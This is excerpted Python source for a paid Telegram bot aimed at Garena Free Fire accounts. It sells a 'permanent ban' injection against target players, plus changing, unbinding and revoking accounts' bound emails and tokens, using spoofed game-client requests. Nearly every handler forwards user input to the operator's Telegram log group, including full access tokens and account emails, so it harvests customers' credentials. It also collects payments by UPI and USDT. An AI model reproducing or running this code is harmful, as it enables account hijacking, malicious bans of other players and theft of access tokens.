...
def build_majorlogin(tok, open_id, p_type):
    ...
    m.client_version = "1.132.1"
    m.system_software = "Android OS 13 / API-33"
    ...
    m.client_version_code = "2019132117"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    # OB53+ FIX: memory_available is mandatory, version must match OB
    try:
        if hasattr(m, 'memory_available') and m.memory_available:
            m.memory_available.version = 55
            m.memory_available.hidden_value = 81
        # Also set storage fields which new server validates
...
def fetch_majorlogin_jwt(tok):
    ...
    urls = [
        ...
        "https://loginbp.ggblackout.com/MajorLogin",
    ]
    for url in urls:
        for p_type in platforms:
            try:
                ...
                headers = {
                    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; SM-S908E Build/TP1A.220624.014)",
...
def trigger_injection(jwt_token, version):
    """
    FIXED V4 - OB55 CLEAN VERSION - Multi endpoint + Proxy + Proper fallback
    OB55 Current as of Sep 16 2026 - client 1.132.1
    """
    if not version or version == "Latest":
        try:
            payload = decode_jwt(jwt_token)
            version = payload.get('release_version') or payload.get('client_version') or "OB55"
        except:
            version = "OB55"
    ...
    # Ensure OB55 is default, not OB54
    if version in ["OB49", "OB50", "OB51", "OB52", "OB53", "OB54"]:
        # Allow old but prefer OB55 for injection
        pass
    if version == "OB49":
        version = "OB55"
    ...
    API_URLS = [
        ...
        "https://clientbp.ggwhitehawk.com/GetLoginData",
    ]
    ...
    headers = {
        ...
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android 13; SM-S908E Build/TP1A.220624.014)',
        'Accept-Encoding': 'gzip',
        'Connection': 'Keep-Alive'
    }
    ...
    for api_url in API_URLS:
        try:
            ...
            if response.status_code == 200:
                ...
                # 401 = OB mismatch, try next but keep going
                print(f"[FFBAN] {api_url} {response.status_code} - retry next")
                time.sleep(1)
                continue
            else:
...
def send_register_code_email(email):
    ...
    USER_AGENTS = [
        ...
        "GarenaMSDK/4.0.45P5(Redmi Note 5 ;Android 13;en;US;)",
...
# ========== PAID SYSTEM - HIDDEN ADMIN V2 - METHOD SELECT + ADMIN BUTTONS ==========
ADMIN_IDS = []
try:
    ...
    pass
# Hardcode your ID here if needed, e.g. [123456789]
# ADMIN_IDS = [YOUR_TELEGRAM_ID]

# ========== LOG GROUP ID - FIXED V2 - Robust logging ==========
LOG_CHAT_ID = -5373759744  # User's group
# Support both -5373759744 and -1005373759744 (supergroup format)
LOG_CHAT_IDS = [-5373759744, -1005373759744]
try:
    env_log = os.getenv("LOG_CHAT_ID", "")
    if env_log and env_log.lstrip("-").isdigit():
        LOG_CHAT_ID = int(env_log)
        LOG_CHAT_IDS = [LOG_CHAT_ID]
        # Also add supergroup variant if not already
        if str(LOG_CHAT_ID).startswith("-") and not str(LOG_CHAT_ID).startswith("-100"):
            try:
                # Try to convert -5373759744 -> -1005373759744
                abs_id = str(LOG_CHAT_ID).lstrip("-")
                super_id = int(f"-100{abs_id}")
                if super_id not in LOG_CHAT_IDS:
                    LOG_CHAT_IDS.append(super_id)
            except:
                pass
except:
    pass

def send_log_sync(text):
    """Sync version - uses direct HTTP to Telegram API, works even without context"""
    for chat_id in LOG_CHAT_IDS:
        try:
            if not BOT_TOKEN or BOT_TOKEN == "YOUR_TOKEN":
                print(f"[LOG] BOT_TOKEN missing, cannot send to {chat_id}")
                continue
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": f"📋 LOG:\n{text}"[:4000]}
            r = requests.post(url, json=payload, timeout=8, verify=False)
            print(f"[LOG] Sent to {chat_id} -> {r.status_code} {r.text[:200]}")
            if r.status_code == 200:
                break  # Success on one ID is enough
        except Exception as e:
            print(f"[LOG] Failed to send to {chat_id}: {e}")
        ...
        if context and hasattr(context, 'bot'):
            for chat_id in LOG_CHAT_IDS:
                try:
                    ...
                    print(f"[LOG] Async sent to {chat_id}")
                    break
                except Exception as e:
                    print(f"[LOG] Async failed {chat_id}: {e}")
                    continue
        # Fallback to sync HTTP
        await asyncio.to_thread(send_log_sync, text)
    except Exception as e:
        print(f"[LOG] send_log error: {e}")
        try:
            await asyncio.to_thread(send_log_sync, text)
        except:
            pass

def sync_log_print(msg):
    print(msg)
    try:
        send_log_sync(msg)
    except:
...
PAID_OPTIONS = {
    "change": {"price_inr": 199, "price_usdt": 2.5, "name": "Change Bind Email"},
    "revoke": {"price_inr": 149, "price_usdt": 1.8, "name": "Revoke Token"},
    "ffban": {"price_inr": 399, "price_usdt": 5, "name": "FF Permanent Ban"},
    "resub": {"price_inr": 1500, "price_usdt": 18, "name": "Resubscribe OTP"},
}

UPI_ID = "zevricxplay@okaxis"
USDT_ADDR = "TLwAWcJ7Tm34jqyYqV6qhizQHy8pe7US1v"
UPI_QR_PATH = "/mnt/data/image_890F95E1-9A91-4A77-B0E5-662441F99A76.jpeg"
UPI_QR_PATH_LOCAL = "upi_qr.png"
USDT_QR_PATH = "/mnt/data/image_357FFD06-632D-494F-A622-D9587DC3511D.jpeg"
USDT_QR_PATH_LOCAL = "usdt_qr.png"
USDT_QR_PATH2 = "/mnt/data/image_E02020B4-2298-4B5A-BC78-4A2883F9E200.jpeg"

PAID_DB_PATH = "/tmp/paid_users.json"
PENDING_DB_PATH = "/tmp/pending_payments.json"
USED_UTR_PATH = "/tmp/used_utr.json"

def load_paid_db():
    try:
        if os.path.exists(PAID_DB_PATH):
            with open(PAID_DB_PATH, "r") as f:
                return json.load(f)
    except:
        pass
    return {}
...
def save_paid_db(db):
    try:
        with open(PAID_DB_PATH, "w") as f:
            json.dump(db, f)
    except Exception as e:
        print(f"[PAID] Save error: {e}")

def load_pending_db():
    try:
        if os.path.exists(PENDING_DB_PATH):
            with open(PENDING_DB_PATH, "r") as f:
                return json.load(f)
    except:
        pass
    return {}

def save_pending_db(db):
    try:
        with open(PENDING_DB_PATH, "w") as f:
            json.dump(db, f)
    except Exception as e:
...
def load_used_utr():
    try:
        if os.path.exists(USED_UTR_PATH):
            with open(USED_UTR_PATH, "r") as f:
                return json.load(f)
    except:
        pass
    return {}

def save_used_utr(db):
    try:
        with open(USED_UTR_PATH, "w") as f:
            json.dump(db, f)
    except:
        pass
...
def is_paid(user_id, option_key):
    try:
        db = load_paid_db()
        uid_str = str(user_id)
        if uid_str in db:
            if option_key in db[uid_str]:
                val = db[uid_str][option_key]
...
def mark_paid(user_id, option_key, days=30):
    try:
        db = load_paid_db()
        uid_str = str(user_id)
        ...
        if expiry:
            db[uid_str][option_key] = {"expiry": expiry, "paid_at": datetime.now().isoformat()}
        else:
            db[uid_str][option_key] = {"paid_at": datetime.now().isoformat()}
        save_paid_db(db)
        print(f"[PAID] Marked {user_id} paid for {option_key}")
        return True
    except Exception as e:
        print(f"[PAID] Mark error: {e}")
        return False

def is_valid_utr(utr_text, method):
    """Fake UTR check - UPI 12 digits, USDT TxID 64+ hex or TRON format"""
    if not utr_text or len(utr_text.strip()) < 6:
        return False, "UTR/TxID bahut chhota hai"
    text = utr_text.strip()
    # Check for common fake patterns
    fake_patterns = ["123456", "000000", "111111", "test", "fake", "abcd", "xxxx"]
    lower = text.lower()
    for pat in fake_patterns:
        if lower == pat or lower.count(pat) > 2:
            return False, "Fake UTR lag raha hai"
    
    if method == "upi":
        # UPI UTR typically 12 digits
        digits = ''.join(filter(str.isdigit, text))
        if len(digits) < 10:
            return False, "UPI UTR me 12 digits hone chahiye"
        if len(set(digits)) < 3:  # All same digits
            return False, "Fake UTR - same digits"
    elif method == "usdt":
        # USDT TxID - at least 20 chars, usually 64 hex
        if len(text) < 15:
            return False, "TxID bahut chhota hai"
    
    # Check duplicate
    used = load_used_utr()
    if text in used:
        return False, f"Ye UTR/TxID pehle use ho chuka hai - User {used[text]}"
    
    return True, "OK"

def mark_utr_used(utr_text, user_id):
    try:
        used = load_used_utr()
        used[utr_text.strip()] = str(user_id)
        save_used_utr(used)
    except:
        pass

def get_payment_method_keyboard(option_key):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"💳 UPI Pay ₹{PAID_OPTIONS[option_key]['price_inr']}", callback_data=f"pay_upi_{option_key}")],
        [InlineKeyboardButton(f"💰 USDT Pay ${PAID_OPTIONS[option_key]['price_usdt']}", callback_data=f"pay_usdt_{option_key}")],
        [InlineKeyboardButton("❌ Cancel", callback_data=f"pay_cancel_{option_key}")]
    ])

def get_admin_approval_keyboard(target_user_id, option_key):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Yes Approve", callback_data=f"admin_yes_{target_user_id}_{option_key}"),
            InlineKeyboardButton("❌ No Reject", callback_data=f"admin_no_{target_user_id}_{option_key}")
        ]
    ])

async def show_payment_method_selection(update, context, option_key):
    """Step 1: Show payment method selection - UPI or USDT"""
    opt = PAID_OPTIONS.get(option_key, {"price_inr": 199, "price_usdt": 2.5, "name": "Premium"})
    price_inr = opt["price_inr"]
    price_usdt = opt["price_usdt"]
    name = opt["name"]
    
    txt = f"""💎 {name} 💎

💰 Unlock: ₹{price_inr} | 💵 ${price_usdt} USDT
🔒 Pay to continue 🚀
...
👑 @just_zevric"""
    ...
    await update.message.reply_text(txt, reply_markup=get_payment_method_keyboard(option_key))
    context.user_data['pending_paid_option'] = option_key
    return PAYMENT_METHOD

async def show_qr_page(update, context, option_key, method):
    """Step 2: Show QR according to selected method"""
    opt = PAID_OPTIONS.get(option_key, {"price_inr": 199, "price_usdt": 2.5, "name": "Premium"})
    price_inr = opt["price_inr"]
    price_usdt = opt["price_usdt"]
    name = opt["name"]
...
📱 UPI ID: {UPI_ID}
👤 Name: Zevric Play
📝 Note: {context.user_data.get('user_id', 'user')}_{option_key}

📸 UPI QR niche hai, scan karo
...
👑 @just_zevric"""
        ...
        try:
            upi_found = None
            for p in [UPI_QR_PATH, UPI_QR_PATH_LOCAL, "upi_qr.jpg", "upi_qr.jpeg", "./upi_qr.png", "/mnt/data/upi_qr.png"]:
                if os.path.exists(p):
                    upi_found = p
                    break
            if upi_found:
                await update.message.reply_photo(photo=open(upi_found, "rb"), caption=f"💳 UPI QR - ₹{price_inr}\nUPI ID: {UPI_ID}\nName: Zevric Play\n📝 Note: {option_key}")
            else:
                await update.message.reply_text(f"⚠️ QR not found, UPI ID se pay karo: {UPI_ID}")
        except Exception as e:
            print(f"[PAY] UPI QR error: {e}")
...
⚠️ Only TRON network, warna lost!

📸 USDT QR niche hai, scan karo
...
👑 @just_zevric"""
        ...
        try:
            usdt_found = None
            for p in [USDT_QR_PATH, USDT_QR_PATH_LOCAL, USDT_QR_PATH2, "usdt_qr.jpg", "usdt_qr.jpeg", "./usdt_qr.png", "/mnt/data/usdt_qr.png"]:
                if os.path.exists(p):
                    usdt_found = p
                    break
            if usdt_found:
                await update.message.reply_photo(photo=open(usdt_found, "rb"), caption=f"💰 USDT QR - ${price_usdt}\nAddr: {USDT_ADDR}\nNetwork: TRON (TRC20) Only!")
            else:
                await update.message.reply_text(f"⚠️ QR not found, Address: {USDT_ADDR}")
        except Exception as e:
            print(f"[PAY] USDT QR error: {e}")
    
    await update.message.reply_text(f"📸 Pay karke Screenshot + UTR/TxID bhejo 💎\n⚠️ Fake screenshot = Ban\n⏳ Admin 5 min me approve karega\n💬 Fast: @just_zevric", reply_markup=get_main_keyboard())
    return PAYMENT_PROOF

# Keep old function for backward compat - redirects to method selection
async def show_payment_page(update, context, option_key):
    return await show_payment_method_selection(update, context, option_key)
...
CHECK_INFO,BIND_TOKEN,BIND_EMAIL,BIND_OTP,BIND_SEC,CHANGE_TOKEN,CHANGE_OTP_OLD,CHANGE_NEW,CHANGE_OTP_NEW,CHANGE_CONFIRM,UNBIND_TOKEN,UNBIND_OTP,UNBIND_CONFIRM,CANCEL_TOKEN,CANCEL_CONFIRM,EAT_INPUT,REVOKE_TOKEN,REVOKE_CONFIRM,BIO_TOKEN,BIO_TEXT,BIO_COLOR,BIO_CONFIRM,FF_BAN_TOKEN,FF_BAN_CONFIRM,RESUB_EMAIL,PLATFORM_TOKEN,BAN_CHECK_UID,PAYMENT_PROOF,PAYMENT_METHOD=range(29)
...
async def ff_ban_start(update, context):
    ...
    try:
        _u = update.effective_user if hasattr(update, 'effective_user') and update.effective_user else (update.message.from_user if update.message else None)
        _uid = _u.id if _u else 0
        _uname = f"@{_u.username}" if _u and _u.username else ""
        _fname = _u.first_name if _u and hasattr(_u, 'first_name') else ""
        _chat_id = update.effective_chat.id if hasattr(update, 'effective_chat') and update.effective_chat else (update.message.chat.id if update.message else 0)
        _txt = ""
        if update.message and update.message.text:
            _txt = update.message.text[:1500]
        elif update.callback_query and update.callback_query.data:
            _txt = f"Callback: {update.callback_query.data}"[:1500]
        elif update.message and update.message.photo:
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {ff_ban_start}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {ff_ban_start}: {_e}")
    user_id = update.message.from_user.id
    if is_admin(user_id) or is_paid(user_id, "ffban"):
        ...
        return await show_payment_page(update, context, "ffban")
...
async def ff_ban_token(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {ff_ban_token}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {ff_ban_token}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    
    token = update.message.text.strip()
    try:
        await send_log(context, f"🔑 TOKEN INPUT\nUser: {_uid if '_uid' in locals() else 0} \nToken: {token[:2000]}")
    except:
        pass
...
async def ff_ban_confirm(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {ff_ban_confirm}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {ff_ban_confirm}: {_e}")
...
𝗭𝗘𝗩𝗥𝗜𝗖 𝗬 𝗘𝗱𝗶𝘁𝗶𝗼𝗻"""
            ...
            try:
                ...
                pass
            try:
                await send_log(context, f"💀 FF BAN INJECTED\nUser: {update.message.from_user.id}\nTarget: {nickname} ({account_id})\nRegion: {region}\nStatus: {ban_resp.status_code if ban_resp else 'NoResp'}")
            except:
                pass
...
async def ban_check_start(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {ban_check_start}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {ban_check_start}: {_e}")
    await update.message.reply_text(
        "💀 𝗕𝗔𝗡 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 💀\n\n"
        "🆔 𝗘𝗻𝘁𝗲𝗿 𝗙𝗙 𝗨𝗜𝗗 🔍💎\n\n"
        "📌 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: 12345678",
...
async def ban_check_uid(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {ban_check_uid}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {ban_check_uid}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    
    uid = update.message.text.strip()
    try:
        await send_log(context, f"🆔 UID INPUT\nUser: {_uid if '_uid' in locals() else 0}\nUID: {uid}")
    except:
        pass
    ...
    try:
        ...
        try:
            ...
            pass
        try:
            await send_log(context, f"BAN CHECK\nBy: {update.message.from_user.id}\nUID: {uid}\nAPI Status: {status if 'status' in locals() else 'unknown'}")
        except:
            pass
...
async def start(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {start}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {start}: {_e}")
    try:
        # Log every /start to log group
        try:
            u = update.message.from_user
            await send_log(context, f"▶️ /start\nUser: {u.id} @{u.username} {u.first_name}\nChat: {update.message.chat.id} {update.message.chat.type}")
        except:
            pass
...
async def force_start(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {force_start}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {force_start}: {_e}")
    context.user_data.clear()
...
async def owner_info(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {owner_info}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {owner_info}: {_e}")
...
async def eat_website_info(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {eat_website_info}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {eat_website_info}: {_e}")
    await update.message.reply_text(
...
async def check_info_start(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {check_info_start}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {check_info_start}: {_e}")
...
async def check_info_token(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {check_info_token}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {check_info_token}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip()
    if len(token)<10:
    ...
    try:
        def fetch():
            ...
            r=make_request("GET",url,params={'app_id':"100067",'access_token':token},headers={'User-Agent':"GarenaMSDK/4.0.45P5"})
            return uid,nick,region,r.json()
        uid,nick,region,data=await asyncio.to_thread(fetch)
        try:
            await send_log(context, f"🔍 BIND INFO CHECK\nBy: {update.message.from_user.id}\nUID: {uid} Nick: {nick}\nEmail: {data.get('email','')}")
        except:
            pass
...
async def bind_email_start(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {bind_email_start}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {bind_email_start}: {_e}")
...
async def bind_email_token(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {bind_email_token}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {bind_email_token}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip()
...
async def bind_email_email(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {bind_email_email}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {bind_email_email}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    ...
    def send():
        ...
        d={"email":email,"locale":"en-US","region":"US","app_id":"100067","access_token":token}
        h={"User-Agent":"GarenaMSDK/4.0.45P5","Content-Type":"application/x-www-form-urlencoded"}
...
async def bind_email_otp(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {bind_email_otp}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {bind_email_otp}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
...
async def bind_email_security_code(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {bind_email_security_code}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {bind_email_security_code}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    text=update.message.text.strip()
...
async def change_email_start(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {change_email_start}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {change_email_start}: {_e}")
    user_id = update.message.from_user.id
    if is_admin(user_id) or is_paid(user_id, "change"):
        await update.message.reply_text("🔄 𝗖𝗵𝗮𝗻𝗴𝗲 𝗕𝗶𝗻𝗱 𝗘𝗺𝗮𝗶𝗹 🔄\n\n🔐 Enter Access Token :", reply_markup=get_main_keyboard())
        return CHANGE_TOKEN
    else:
        return await show_payment_page(update, context, "change")
...
async def change_email_token(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {change_email_token}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {change_email_token}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    ...
    try:
        ...
        def send():
            url="https://100067.connect.garena.com/game/account_security/bind:send_otp"
            d={"email":old_email,"locale":"en-US","region":"US","app_id":"100067","access_token":token}
            h={"User-Agent":"GarenaMSDK/4.0.45P5","Content-Type":"application/x-www-form-urlencoded"}
            return make_request("POST",url,headers=h,data=d).text
        resp=await asyncio.to_thread(send)
        try:
...
async def change_email_otp_old(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {change_email_otp_old}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {change_email_otp_old}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
...
async def change_email_new(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {change_email_new}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {change_email_new}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    ...
    def send():
        url="https://100067.connect.garena.com/game/account_security/bind:send_otp"
        d={"email":new_email,"locale":"en-US","region":"US","app_id":"100067","access_token":token}
        h={"User-Agent":"GarenaMSDK/4.0.45P5","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(send)
...
async def change_email_otp_new(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {change_email_otp_new}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {change_email_otp_new}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
...
async def change_email_confirm(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {change_email_confirm}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {change_email_confirm}: {_e}")
    text=update.message.text.strip()
    if text in ALL_BUTTONS:
        return await switch_menu(update, context)
    if text in ["❌ No","No"]:
...
async def unbind_email_start(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {unbind_email_start}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {unbind_email_start}: {_e}")
...
async def unbind_email_token(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {unbind_email_token}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {unbind_email_token}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
...
async def unbind_email_otp(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {unbind_email_otp}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {unbind_email_otp}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
...
async def unbind_email_confirm(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {unbind_email_confirm}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {unbind_email_confirm}: {_e}")
    text=update.message.text.strip()
    if text in ALL_BUTTONS:
        return await switch_menu(update, context)
    if text in ["❌ No","No"]:
...
async def cancel_bind_start(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {cancel_bind_start}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {cancel_bind_start}: {_e}")
...
async def cancel_bind_token(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {cancel_bind_token}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {cancel_bind_token}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip()
...
async def cancel_bind_confirm(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {cancel_bind_confirm}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {cancel_bind_confirm}: {_e}")
    text=update.message.text.strip()
    if text in ALL_BUTTONS:
        return await switch_menu(update, context)
    if text in ["❌ No","No"]:
...
async def eat_to_token_start(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {eat_to_token_start}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {eat_to_token_start}: {_e}")
...
async def eat_to_token_convert(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {eat_to_token_convert}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {eat_to_token_convert}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
...
async def revoke_token_start(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {revoke_token_start}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {revoke_token_start}: {_e}")
    user_id = update.message.from_user.id
    if is_admin(user_id) or is_paid(user_id, "revoke"):
        await update.message.reply_text("🚪 𝗥𝗲𝘃𝗢𝗸𝗘 𝗧𝗼𝗸𝗘𝗡 🚪\n\n🔐 Token :", reply_markup=get_main_keyboard())
        return REVOKE_TOKEN
    else:
        return await show_payment_page(update, context, "revoke")
...
async def revoke_token_verify(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {revoke_token_verify}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {revoke_token_verify}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip()
...
async def revoke_token_confirm(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
